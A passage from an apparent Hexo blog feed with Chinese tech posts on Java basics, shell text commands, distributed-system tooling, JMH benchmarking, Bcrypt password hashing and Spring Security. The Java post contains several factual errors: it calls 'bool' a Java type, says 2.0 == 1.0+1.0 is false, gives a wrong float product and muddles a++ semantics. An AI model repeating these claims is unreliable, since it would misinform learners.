rel="noopener">https://zhuanlan.zhihu.com/p/31803182</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 基础</title>
      <link href="/java/java/1-java-basic/"/>
      <url>/java/java/1-java-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-背景"><a href="#Java-背景" class="headerlink" title="Java 背景"></a>Java 背景</h2><p>Java是由Sun Microsystems最初开发并于1995年发布的高级编程语言。Java在各种平台上运行，例如Windows，Mac OS和各种UNIX版本。</p><h2 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h2><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>abstract</td><td>assert</td><td>boolean</td><td>break</td></tr><tr><td>byte</td><td>case</td><td>catch</td><td>char</td></tr><tr><td>class</td><td>const</td><td>continue</td><td>default</td></tr><tr><td>do</td><td>double</td><td>else</td><td>enum</td></tr><tr><td>extends</td><td>final</td><td>finally</td><td>float</td></tr><tr><td>for</td><td>goto</td><td>if</td><td>implements</td></tr><tr><td>import</td><td>instanceof</td><td>int</td><td>interface</td></tr><tr><td>long</td><td>native</td><td>new</td><td>package</td></tr><tr><td>private</td><td>protected</td><td>public</td><td>return</td></tr><tr><td>short</td><td>static</td><td>strictfp</td><td>super</td></tr><tr><td>switch</td><td>synchronized</td><td>this</td><td>throw</td></tr><tr><td>throws</td><td>transient</td><td>try</td><td>void</td></tr><tr><td>volatile</td><td>while</td><td></td></tr></tbody></table><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>Java有两种可用的数据类型</p><ul><li>原始数据类型共8种</li><li>引用/对象数据类型</li></ul><h3 id="原始数据类型"><a href="#原始数据类型" class="headerlink" title="原始数据类型"></a>原始数据类型</h3><p>Byte</p><ul><li>字节数据类型是8位带符号的二进制补码整数</li><li>最小值是-128（-2 ^ 7）</li><li>最大值为127（含）（2 ^ 7 -1）</li><li>默认值为0</li><li>字节数据类型用于节省大型数组中的空间，主要用于代替整数，因为字节比整数小四倍。</li><li>示例：字节a = 100，字节b = -50</li></ul><p>Short</p><ul><li>短数据类型是一个16位带符号的二进制补码整数</li><li>最小值是-32,768（-2 ^ 15）</li><li>最大值为32,767（含）（2 ^ 15 -1）</li><li>短数据类型也可以用于将内存保存为字节数据类型。短路比整数小2倍</li><li>预设值为0。</li><li>例如：short s = 10000，short r = -20000</li></ul><p>Int</p><ul><li>Int数据类型是32位带符号的二进制补码整数。</li><li>最小值是-2,147,483,648（-2 ^ 31）</li><li>最大值为2,147,483,647（含）（2 ^ 31 -1）</li><li>除非担心内存，否则通常将整数用作整数值的默认数据类型。</li><li>默认值为0</li><li>例如：int a = 100000，int b = -200000</li></ul><p>Long </p><ul><li>长数据类型是64位带符号的二进制补码整数</li><li>最小值是-9,223,372,036,854,775,808（-2 ^ 63）</li><li>最大值为9,223,372,036,854,775,807（含）（2 ^ 63 -1）</li><li>当需要比int更大的范围时使用此类型</li><li>默认值为0L</li><li>示例：长a = 100000L，长b = -200000L</li></ul><p>Float</p><ul><li>浮点数据类型是单精度32位IEEE 754浮点</li><li>浮点数主要用于以大数组浮点数保存内存</li><li>默认值为0.0f</li><li>浮动数据类型从不用于诸如货币之类的精确值</li><li>示例：float f1 = 234.5f</li></ul><p>Double </p><ul><li>double数据类型是双精度64位IEEE 754浮点</li><li>此数据类型通常用作十进制值的默认数据类型，通常是默认选择</li><li>绝对不能将双精度数据类型用于货币等精确值</li><li>默认值为0.0d</li><li>例如：double d1 = 123.4</li></ul><p>Bool</p><ul><li>布尔数据类型表示一位信息</li><li>只有两个可能的值：true和false</li><li>此数据类型用于跟踪真/假条件的简单标志</li><li>默认值为假</li><li>示例：bool isTrue = true</li></ul><p>Char</p><ul><li>char数据类型是单个16位Unicode字符</li><li>最小值为“ \ u0000”（或0）</li><li>最大值为“ \ uffff”（或65,535（含））</li><li>Char数据类型用于存储任何字符</li><li>示例：char letterA =’A’</li></ul><h3 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h3><ul><li>引用变量是使用类的已定义构造函数创建的。它们用于访问对象。这些变量被声明为无法更改的特定类型。</li><li>类对象和各种类型的数组变量都属于引用数据类型。</li><li>任何引用变量的默认值为null。</li><li>引用变量可用于引用声明类型或任何兼容类型的任何对象。</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>定义一个数组</p><pre><code>dataType[] arrayRefVar;   // 推荐的方式ordataType arrayRefVar[];  // 工作，但不推荐</code></pre><p>创建数组</p><pre><code>arrayRefVar = new dataType[arraySize];</code></pre><p>使用已知数据创建数组</p><pre><code>dataType[] arrayRefVar = {value0, value1, ..., valuek};</code></pre><p>处理数组的一个例子</p><pre><code>public class TestArray {   public static void main(String[] args) {      double[] myList = {1.9, 2.9, 3.4, 3.5};      // Print all the array elements      for (int i = 0; i &lt; myList.length; i++) {         System.out.println(myList[i] + &quot; &quot;);      }      // Summing all elements      double total = 0;      for (int i = 0; i &lt; myList.length; i++) {         total += myList[i];      }      System.out.println(&quot;Total is &quot; + total);      // Finding the largest element      double max = myList[0];      for (int i = 1; i &lt; myList.length; i++) {         if (myList[i] &gt; max) max = myList[i];      }      System.out.println(&quot;Max is &quot; + max);     }}</code></pre><p>数组的内存空间分为两部分，一块用于存储引用，一块存储真实的数据。</p><p><img src="/java/java/1-java-basic/java_array.jpg" alt="数组地址空间">;</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><table><thead><tr><th>操作符</th><th>描述</th><th>范例</th></tr></thead><tbody><tr><td>+（加法）</td><td>在运算符的任一侧添加值。</td><td>A + B会得到30</td></tr><tr><td>-（减法）</td><td>从左操作数中减去右操作数。</td><td>A-B会得到-10</td></tr><tr><td>*（乘法）</td><td>将运算符两边的值相乘。</td><td>A * B会得到200</td></tr><tr><td>/（部门）</td><td>用左手操作数除以右手操作数。</td><td>B / A会得到2</td></tr><tr><td>％（模量）</td><td>将左操作数除以右操作数，然后返回余数。</td><td>B％A得到0</td></tr><tr><td>++（增量）</td><td>将操作数的值增加1。</td><td>B++得到21</td></tr><tr><td>-（减量）</td><td>将操作数的值减1。</td><td>B–得到19</td></tr></tbody></table><p>运算注意长度</p><pre><code>int a = 2147483647*2 // 得到 -2 因为超长了long a = 2147483647*2 // 也不行，因为还是 int long a = 2147483647*2L // 工作了，转换成long 了</code></pre><p>整数除法不是四舍五入，而是直接舍去小数</p><pre><code>double d = 10/4 // 结果是2double d = 10/4.0 // 正确double d = 10/(double)4 // 正确</code></pre><p>小数比较无意义</p><pre><code>boole same = 2.0 == 1.0+1.0 //false 计算机浮点问题</code></pre><p>小数计算结果不精确</p><p>float f = 0.1F * 0.1F // 结果是 0.00000001</p><p>自增（++）理解很简单 </p><pre><code>b = a++-1本质是b = (a++)-1等效于a = a + 1b = a -1</code></pre><p>原理是 –/++ 的运算优先级很高。a++ 是先做其他操作，在自增;a++ 是先自增再做其他操作。</p><p>对象的比较是比较的引用，而非值本身</p><h2 id="转义表"><a href="#转义表" class="headerlink" title="转义表"></a>转义表</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>\n</td><td>换行（0x0a）</td></tr><tr><td>\r</td><td>回车（0x0d）</td></tr><tr><td>\F</td><td>换页（0x0c）</td></tr><tr><td>\b</td><td>退格键（0x08）</td></tr><tr><td>\s</td><td>空格（0x20）</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>\“</td><td>双引号</td></tr><tr><td>\’</td><td>单引号</td></tr><tr><td>\</td><td>反斜杠</td></tr><tr><td>\DDD</td><td>八进制字符（ddd）</td></tr><tr><td>\uxxxx</td><td>十六进制UNICODE字符（xxxx）</td></tr></tbody></table><h2 id="Java-各个版本更新特性"><a href="#Java-各个版本更新特性" class="headerlink" title="Java 各个版本更新特性"></a>Java 各个版本更新特性</h2><ul><li>JDK5 foreach 迭代方式、可变参数、枚举、自动拆装箱、泛型、注解</li><li>JDK6 SystemTray 类、 COmpiler API、Command Annotations</li><li>JDK7 switch 支持字符串匹配条件、泛型类型自动推断、try-with-resources 资源关闭、Objects 类、ForkJoinPool 等</li><li>JDK8 接口的默认方法实现和静态方法、Lambda 表达式、函数式接口、方法和构造函数引用、新的日期和时间API、流处理</li><li>JDK9 模块化、简化进程API、JSON API、钱和货币的API</li><li>JDK10 局部变量的类型推断、改进 GC和内存管理、线程本地握手、备用内存设备上的堆分配</li></ul><h2 id="this-与-super"><a href="#this-与-super" class="headerlink" title="this 与 super"></a>this 与 super</h2><p>共同点</p><ul><li>都是关键字，起指代作用</li><li>在构造方法中必须出现在第一行</li></ul><p>this</p><ul><li>访问本类示例属性和方法</li><li>先找本类没有再找父类</li><li>单独使用表示当前对象</li></ul><p>super </p><ul><li>用于子类直接访问父类的实例属性和方法</li><li>直接找到父类</li><li>在子类复写父类方法时，访问父类同名方法</li></ul><h2 id="Java-中参数传递"><a href="#Java-中参数传递" class="headerlink" title="Java 中参数传递"></a>Java 中参数传递</h2><ul><li>无论是对于基本数据类型，还是引用类型，java 中的参数传递都是值复制的传递过程。对于引用变量，复制指向对象的首地址。</li></ul><h2 id="什么时候防御编程做参数验证"><a href="#什么时候防御编程做参数验证" class="headerlink" title="什么时候防御编程做参数验证"></a>什么时候防御编程做参数验证</h2><p>一般在最外层做数据校验，使用 bean validation 做数据的基本校验，然后在内部使用业务的校验。</p><h2 id="常见-POJO-缩写的含义"><a href="#常见-POJO-缩写的含义" class="headerlink" title="常见 POJO 缩写的含义"></a>常见 POJO 缩写的含义</h2><ul><li>POJO Plain Ordinary Java Object </li><li>DO Data Object </li><li>BO Business Object</li><li>DTO Data Transfer Object</li><li>VO View Object </li><li>AO Application Object</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.tutorialspoint.com/java/index.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/java/index.htm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Shell 文字处理函数</title>
      <link href="/linux/linux/shell-wording/"/>
      <url>/linux/linux/shell-wording/</url>
      
        <content type="html"><![CDATA[<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>用于查看文件</p><blockquote><p>cat file.txt</p></blockquote><p>多个文件同时使用</p><blockquote><p>cat file1.txt  file2.txt</p></blockquote><p>显示行号</p><blockquote><p>cat -n [filename]</p></blockquote><p>甚至从命令行写入文件</p><blockquote><p>cat &gt; [name-of-new-file]</p></blockquote><p>复制文件（通常不要这样干，用 cp）</p><blockquote><p>cat file1.txt &gt; file3.txt</p></blockquote><p>行尾高亮</p><blockquote><p>cat -E file1.txt</p></blockquote><p>显示空白字符</p><blockquote><p>cat -v file9.txt</p></blockquote><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>从指定文件中搜索字符串。</p><p>简单搜索</p><blockquote><p>grep word sample2</p></blockquote><p>多个文件搜索</p><blockquote><p>grep word sample sample2 sample3</p></blockquote><p>搜索当前文件夹</p><blockquote><p>grep word *</p></blockquote><p>搜索完整的文字</p><blockquote><p>grep -w word *</p></blockquote><p>不区分大小写</p><blockquote><p>grep -i word *</p></blockquote><p>子目录递归搜索</p><blockquote><p>grep -r word *</p></blockquote><p>反向搜索,排除关键字</p><blockquote><p>grep -v word sample</p></blockquote><p>整行匹配</p><blockquote><p>grep -x “word line1” *</p></blockquote><p>获取匹配的文件列表</p><blockquote><p>grep -l word *</p></blockquote><p>统计匹配行数</p><blockquote><p>grep -c word *</p></blockquote><p>限制输出行数</p><blockquote><p>grep –m2 word sample</p></blockquote><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p>awk shell 中非常强大的命令，通常用来提取固定模式的字符串。</p><p>TODO </p><h2 id="seed"><a href="#seed" class="headerlink" title="seed"></a>seed</h2><p>和 awk 一样是非常重要的一个命令，开发者必须掌握。</p><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>统计文本数量的工具，例如</p><blockquote><p>wc myfile.txt</p></blockquote><p>5 13 57 myfile.txt</p><p>5 是文件行数，13 是单词数，57 是字符数量。</p><p>只获取行数</p><blockquote><p>wc -l </p></blockquote><p>结合管道使用获取当前目录文件数量</p><blockquote><p>ls -1 | wc -l</p></blockquote><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>sort 不仅在文字处理上非常有用，服务器调优的时候也非常有用,可以快速地找 cpu 性能较差的服务。</p><blockquote><p>sort list.txt</p></blockquote><p>根据第二列排序 </p><blockquote><p>sort -k2 list.txt</p></blockquote><p>如果排序的字符是数字可以加上 n</p><blockquote><p>sort -nk9 list.txt</p></blockquote><h2 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h2><p>这个命令比较简单，将重复的数据只显示一行，一般配合 sort 使用，常用有两个参数，计数和忽略大小写。</p><blockquote><p>uniq -c list.txt </p></blockquote><blockquote><p>uniq -i list.txt</p></blockquote><h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p>这个命令可以用来转换和修改输入字符，例如大小写转换和提取数字</p><blockquote><p>cat testfile |tr a-z A-Z </p></blockquote><blockquote><p>echo “2014年7月21日” | tr -cd “[0-9]” 提取出数字</p></blockquote><h2 id="综合应用"><a href="#综合应用" class="headerlink" title="综合应用"></a>综合应用</h2><p>提取字符串中的数字</p><p>sed</p><blockquote><p>sed ‘s/[^0-9]*//g’</p></blockquote><p>shell 自带功能</p><blockquote><p>echo “${VAR1//[!0-9]/}”</p></blockquote><p>grep</p><blockquote><p>echo $VAR1 | grep -o -E ‘[0-9]+’</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一套分布式系统架构的技术集合</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/distributed-system-overview/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/distributed-system-overview/</url>
      
        <content type="html"><![CDATA[<h2 id="开发和构建"><a href="#开发和构建" class="headerlink" title="开发和构建"></a>开发和构建</h2><ul><li>代码仓库<ul><li>Git</li><li>Gitlab </li><li>Gogos </li></ul></li><li>CI/CD<ul><li>Jenkins</li><li>Ansible</li></ul></li><li>质量控制<ul><li>findbugs</li><li>checkstyle</li><li>sonarQube</li></ul></li><li>管理看板 <ul><li>Jira</li></ul></li><li>开发工具<ul><li>Idea</li><li>Idea mybatis 插件</li></ul></li><li>性能分析<ul><li>AB testing</li><li>Jmeter</li><li>JMH</li></ul></li><li>服务器调优和问题分析<ul><li>阿里开源工具 arthas</li><li>线上问题排查工具 <a href="https://github.com/oldratlee/useful-scripts" target="_blank" rel="noopener">https://github.com/oldratlee/useful-scripts</a></li><li>VisuaVM 可视化内存分析</li><li>top 命令</li><li>jstack</li><li>JProfiler</li><li>jstat</li><li>jmap</li><li>MAT</li></ul></li></ul><h2 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h2><ul><li><p>服务器监控平台</p><ul><li>zabbix</li></ul></li><li><p>防火墙</p><ul><li>IPtables</li><li>firewall </li></ul></li><li>操作系统<ul><li>CentOS</li></ul></li></ul><h2 id="业务架构建模"><a href="#业务架构建模" class="headerlink" title="业务架构建模"></a>业务架构建模</h2><ul><li>DDD </li><li>领域驱动设计事件工作坊</li><li>StartUML 类图</li><li>C4paint 架构图绘制工具</li></ul><h2 id="分布式架构"><a href="#分布式架构" class="headerlink" title="分布式架构"></a>分布式架构</h2><ul><li>分布式授权<ul><li>OAuth2</li><li>Spring security </li></ul></li><li>企业授权管理<ul><li>LDAP</li></ul></li><li>REST client<ul><li>feign Client</li></ul></li><li>RPC 框架<ul><li>dubbo</li><li>Grpc</li><li>Thrift</li></ul></li><li>负载均衡<ul><li>ngnix 方案<ul><li>Linux 心跳监控 keepalived</li><li>服务发现 consul</li></ul></li><li>Spring cloud 方案<ul><li>服务发现 Netflix Eureka</li><li>客户端负载均衡 Netflix Ribbon</li></ul></li><li>网络层负载均衡 LVS</li><li>服务网关 <ul><li>Netflix Zuul</li></ul></li></ul></li><li>分布式服务存储<ul><li>fastDFS</li><li>GFS</li></ul></li><li><p>数据源中间件</p><ul><li>Druid</li></ul></li><li><p>分布式链路追踪</p><ul><li>OpenZipkin </li></ul></li><li>日志系统<ul><li>Elasticsearch</li><li>FileBeat</li><li>Kibana</li></ul></li></ul><h2 id="分布式存储"><a href="#分布式存储" class="headerlink" title="分布式存储"></a>分布式存储</h2><ul><li>MySQL</li><li>Redis 集群</li><li>MongoDB</li></ul><h2 id="消息中间件"><a href="#消息中间件" class="headerlink" title="消息中间件"></a>消息中间件</h2><ul><li>Kafka</li><li>RabitMQ</li><li>ActiveMQ</li></ul><h2 id="容器云"><a href="#容器云" class="headerlink" title="容器云"></a>容器云</h2><ul><li>Docker</li><li>集群管理<ul><li>K8s</li><li>Swarm</li></ul></li><li>容器面板<ul><li>Portainer</li></ul></li></ul><h2 id="前端单页应用"><a href="#前端单页应用" class="headerlink" title="前端单页应用"></a>前端单页应用</h2><ul><li>Vue </li><li>Nodejs</li></ul><h2 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h2><ul><li>API 限流<ul><li>LUA</li><li>Redis 限流</li></ul></li><li>容灾</li></ul><h2 id="架构相关博客推荐"><a href="#架构相关博客推荐" class="headerlink" title="架构相关博客推荐"></a>架构相关博客推荐</h2><ul><li><a href="https://www.cnblogs.com/f-ck-need-u/p/7576137.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7576137.html</a></li></ul><h2 id="相关书籍推荐"><a href="#相关书籍推荐" class="headerlink" title="相关书籍推荐"></a>相关书籍推荐</h2>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java JMH 微基准测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/jmh/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/jmh/</url>
      
        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>当我们在谈论某个 Java 语法特性的性能，或者一段业务代码的性能时，往往是凭经验或者写一个简单的循环来测试其是效果。实际上 JVM 的开发者们，已经有一个非常好的工具来做方法层面的基准测试（相对于 ab 测试和 jmeter）。</p><p>JMH 是一个用于构建、运行和分析 Java 方法运行性能工具，可以做到 nano/micro/mili/macro 时间粒度。JMH 不仅可以分析 Java 语言，基于 JVM 的语言都可以使用。</p><p>OpenJdk 官方运行 JMH 测试推的方法是使用 Maven 构建一个单独的项目，然后把需要测试的项目作为 Jar 包引入。这样能排除项目代码的干扰，得到比较可靠地测试效果。当然也可以使用 IDE 或者 Gradle 配置到自己项目中，便于和已有项目集成，代价是配置比较麻烦并且结果没那么可靠。</p><h2 id="使用-Maven-构建基准测试"><a href="#使用-Maven-构建基准测试" class="headerlink" title="使用 Maven 构建基准测试"></a>使用 Maven 构建基准测试</h2><p>根据官网的例子，我们可以使用官网的一个模板项目。</p><blockquote><p>mvn archetype:generate \<br>          -DinteractiveMode=false \<br>          -DarchetypeGroupId=org.openjdk.jmh \<br>          -DarchetypeArtifactId=jmh-java-benchmark-archetype \<br>          -DgroupId=org.sample \<br>          -DartifactId=test \<br>          -Dversion=1.0</p></blockquote><p>创建一个项目，导入 IDE，Maven 会帮我们生成一个测试类，但是这个测试类没有任何内容，这个测试也是可以运行的。</p><p>先编译成 jar</p><blockquote><p>mvn clean install</p></blockquote><p>然后使用 javar -jar 来运行测试</p><blockquote><p>java -jar target/benchmarks.jar</p></blockquote><p>运行后可以看到输出信息中包含 JDK、JVM 等信息，以及一些用于测试的配置信息。</p><pre><code># JMH version: 1.22# VM version: JDK 1.8.0_181, Java HotSpot(TM) 64-Bit Server VM, 25.181-b13# VM invoker: /Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/bin/java# VM options: &lt;none&gt;# Warmup: 5 iterations, 10 s each# Measurement: 5 iterations, 10 s each# Timeout: 10 min per iteration# Threads: 1 thread, will synchronize iterations# Benchmark mode: Throughput, ops/time# Benchmark: org.sample.MyBenchmark.testSimpleString</code></pre><p>下面是一些配置信息说明</p><ul><li>Warmup 因为 JVM 即时编译的存在，所以为了更加准确有一个预热环节，这里是预热  5，每轮 10s。</li><li>Measurement 是真实的性能测量参数，这里是 5轮，每轮10s。</li><li>Timeout 每轮测试，JMH 会进行 GC 然后暂停一段时间，默认是 10 分钟。</li><li>Threads 使用多少个线程来运行，一个线程会同步阻塞执行。</li><li>Benchmark mode 输出的运行模式，常用的有下面几个。<ul><li>Throughput 吞吐量，即每单位运行多少次操作。</li><li>AverageTime 调用的平均时间，每次调用耗费多少时间。</li><li>SingleShotTime 运行一次的时间，如果把预热关闭可以测试代码冷启动时间</li></ul></li><li>Benchmark 测试的目标类</li></ul><p>实际上还有很多配置，可以通过 -h 参数查看</p><blockquote><p>java -jar target/benchmarks.jar -h</p></blockquote><p>由于默认的配置停顿的时间太长，我们通过注解修改配置，并增加了 Java 中最基本的字符串操作性能对比。</p><pre><code>@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3)@Measurement(iterations = 5, time = 5, timeUnit = TimeUnit.SECONDS)@Threads(8)@Fork(1)@OutputTimeUnit(TimeUnit.MILLISECONDS)public class MyBenchmark {    @Benchmark    public void testSimpleString() {        String s = &quot;Hello world!&quot;;        for (int i = 0; i &lt; 10; i++) {            s += s;        }    }    @Benchmark    public void testStringBuilder() {        StringBuilder sb = new StringBuilder();        for (int i = 0; i &lt; 10; i++) {            sb.append(i);        }    }}</code></pre><p>在控制台可以看到输出的测试报告，我们直接看最后一部分即可。</p><pre><code>Benchmark                       Mode  Cnt      Score      Error   UnitsMyBenchmark.testSimpleString   thrpt   10    226.930 ±   16.621  ops/msMyBenchmark.testStringBuilder  thrpt   10  80369.037 ± 3058.280  ops/ms</code></pre><p>Score 这列的意思是每毫秒完成了多少次操作，可见 StringBuilder 确实比普通的 String 构造器性能高很多。</p><h2 id="更多有趣的测试"><a href="#更多有趣的测试" class="headerlink" title="更多有趣的测试"></a>更多有趣的测试</h2><p>实际上平时 Java 开发中一些细节对性能有明显的影响，虽然对系统整体来说影响比较小，但是注意这些细节可以低成本的避免性能问题堆积。</p><p>其中一个非常有意思细节是自动包装类型的使用，即使是一个简单的 for 循环，如果不小心讲 int 使用成 Integer 也会造成性能浪费。</p><p>我们来编写一个简单的基准测试</p><pre><code>@Benchmark    public void primaryDataType() {        int sum = 0;        for (int i = 0; i &lt; 10; i++) {            sum += i;        }    }    @Benchmark    public void boxDataType() {        int sum = 0;        for (Integer i = 0; i &lt; 10; i++) {            sum += i;        }    }</code></pre><p>运行测试后，得到下面的测试结果</p><pre><code>AutoBoxBenchmark.boxDataType       thrpt    5   312779.633 ±   26761.457  ops/msAutoBoxBenchmark.primaryDataType   thrpt    5  8522641.543 ± 2500518.440  ops/ms</code></pre><p>基本类型的性能高出了一个数量级。当然你可能会说基本类型这种性能问题比较微笑，但是性能往往就是这种从细微处提高的。另外编写 JMH 测试也会让团队看待性能问题更为直观。</p><h2 id="一份直观的-Java-基础性能报告"><a href="#一份直观的-Java-基础性能报告" class="headerlink" title="一份直观的 Java 基础性能报告"></a>一份直观的 Java 基础性能报告</h2><p>下面是我写的常见场景的性能测试，例如 StringBuilder 比 new String() 速度快几个数量级。</p><table><thead><tr><th>Test</th><th>Mode</th><th>OPS</th><th>Unit</th></tr></thead><tbody><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.boxDataType”</td><td>“thrpt”</td><td>323693300.862712</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.AutoBoxBenchmark.primaryDataType”</td><td>“thrpt”</td><td>9421830157.195677</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.test”</td><td>“thrpt”</td><td>204814.611974</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.CacheValueBenchmark.testStringBuilder”</td><td>“thrpt”</td><td>80039810.903665</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByAssignment”</td><td>“thrpt”</td><td>197815.644537</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByConstructor”</td><td>“thrpt”</td><td>205494.677150</td><td>ops/s</td></tr><tr><td>“cn.printf.jmhreports.StringBenchmark.constructStringByStringBuilder”</td><td>“thrpt”</td><td>66162972.690813</td><td>ops/s</td></tr></tbody></table><p>代码仓库和持续更新的基准测试可以看下面的仓库。</p><p><a href="https://github.com/linksgo2011/jmh-reports" target="_blank" rel="noopener">https://github.com/linksgo2011/jmh-reports</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://openjdk.java.net/projects/code-tools/jmh/" target="_blank" rel="noopener">http://openjdk.java.net/projects/code-tools/jmh/</a></li><li><a href="https://github.com/melix/jmh-gradle-plugin" target="_blank" rel="noopener">https://github.com/melix/jmh-gradle-plugin</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 Bcrypt 代替 md5/sha1</title>
      <link href="/%E5%AE%89%E5%85%A8/security/safe-hash/"/>
      <url>/%E5%AE%89%E5%85%A8/security/safe-hash/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>如果数据库被“拖库”明文存储的密码就变得不安全。之前的做法是使用 md5 散列的方式，因为 md5 不可逆，无法从密文推出原文。</p><p>但是 HASH 算法最大的问题是，会发生撞库，也就是说，有可能出现多个原文得到同一个密码。</p><p>下面这个式子是存在的，如果原文是 M1，只需要另外一个同样 HASH 值的密码即可登录。</p><blockquote><p>MD5(M1) = MD5(M2) = MD5(M3)</p></blockquote><p>一种攻击方法是，攻击者记录了一张巨大的密码库，预先计算了常用密码的 hash 值，这样只需要搜索 hash 值就能寻找到一个合适的密码用于登录。</p><p>这就是被彩虹表攻击。</p><p>解决彩虹表的问题是加盐，在加密之前，对原文混入其他信息，混入的信息不存放到数据库中。实际寻找到其他原文也无法登录。</p><p>第二中攻击方法是王小云教授寻找到的一种新的方法，通过算法快速的找到 M2，这样不依赖彩虹表就可以实施攻击。</p><blockquote><p>MD5(M1) = MD5(M2)</p></blockquote><p>当被攻击者价值非常大，攻击者获取足够多的撞库原文，还是能分析盐值。</p><h2 id="Bcrypt"><a href="#Bcrypt" class="headerlink" title="Bcrypt"></a>Bcrypt</h2><p>Bcrypt 有两个特点</p><ul><li>每一次 HASH 出来的值不一样</li><li>计算非常缓慢</li></ul><p>因此使用 Bcrypt 进行加密后，攻击者想要使用算出 M2 成本变得不可接受。但代价是应用自身也会性能受到影响，不过登录行为并不是随时在发生，因此能够忍受。对于攻击者来说，需要不断计算，让攻击变得不太可能。</p><p>因此推荐使用 Bcrypt 进行密码加密。</p><h2 id="在-Java-中使用-Bcrypt"><a href="#在-Java-中使用-Bcrypt" class="headerlink" title="在 Java 中使用 Bcrypt"></a>在 Java 中使用 Bcrypt</h2><p>如果引入了 Spring Security, BCryptPasswordEncoder 提供了相关的方法。</p><pre><code>    public String encode(CharSequence rawPassword) {        String salt;        if (this.strength &gt; 0) {            if (this.random != null) {                salt = BCrypt.gensalt(this.strength, this.random);            } else {                salt = BCrypt.gensalt(this.strength);            }        } else {            salt = BCrypt.gensalt();        }        return BCrypt.hashpw(rawPassword.toString(), salt);    }</code></pre><p>BCryptPasswordEncoder 调用了另外一个类 BCrypt 完成加密操作，实际工作工作中可以直接使用 BCryptPasswordEncoder 类即可。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><ul><li><a href="https://blog.csdn.net/nnsword/article/details/78191292" target="_blank" rel="noopener">https://blog.csdn.net/nnsword/article/details/78191292</a></li><li><a href="https://www.cnblogs.com/qianjinyan/p/10636404.html" target="_blank" rel="noopener">https://www.cnblogs.com/qianjinyan/p/10636404.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring Security 基础</title>
      <link href="/Spring/spring/spring-security/"/>
      <url>/Spring/spring/spring-security/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Spring Security 主要解决用户的认证和授权问题，以及一些技术防护设施，例如 XSS、CSRF问题。</p><p>Spring Security 不仅仅解决权限和认证问题，还解决一些安全过滤，以及增加 HTTP 头部等能力。</p><p>基本概念</p><p>– SecurityContextHolder 存放认证上上下文信息 SecurityContext<br>– SecurityContext 存放 Authentication 以及一些请求信息，用于全局跨上下文访问<br>– Authentication  存放用户认证后的信息，用户名和权限列表<br>– UserDetails 用户信息，例如用户名、密码、是否过期<br>– UserDetailsService AuthenticationProvider 进行验证时，调用该服务获取用户信息<br>– UsernamePasswordAuthenticationToken 存放用户名和密码，用于后面的验证<br>– AuthenticationManager 支持多种验证方式进行验证，只要有一个验证通过即可，默认会加载 DaoAuthenticationProvider 进行验证<br>– AuthenticationEntryPoint 处理验证过程中的异常信息</p><h3 id="主要验证流程"><a href="#主要验证流程" class="headerlink" title="主要验证流程"></a>主要验证流程</h3><p><img src="/Spring/spring/spring-security/spring-security-flow.png" alt=""></p><h3 